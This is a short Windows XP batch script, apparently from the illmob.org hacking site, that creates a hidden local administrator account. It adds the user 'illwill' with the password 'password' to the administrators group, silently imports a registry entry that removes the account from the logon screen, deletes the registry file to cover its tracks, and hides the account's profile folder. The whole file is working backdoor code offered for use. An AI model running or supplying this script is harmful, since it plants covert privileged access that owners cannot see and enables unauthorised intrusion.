   @echo off
   @echo HideUserXP.bat
   @echo by illwill    http://illmob.org
   @echo This will create a hidden user with admin rights in XP
   @echo ( hidden meaning that the username wont appear in the logon screen)
   @echo To log on to your hidden account, you need to use the Log On To Windows dialog box by pressing Ctrl + Alt + Delete twice.
   @echo Make sure you're logged off all accounts. You can't just switch users.


   net user illwill password /add && net localgroup administrators illwill /add
   echo Windows Registry Editor Version 5.00> c:\hide.reg
   echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList]>> c:\hide.reg
   echo "illwill"=dword:00000000>> c:\hide.reg
   REGEDIT /S c:\hide.REG
   DEL /Q c:\hide.REG
   attrib +r +a +s +h %SystemDrive%\docume~1\illwill
   Exit
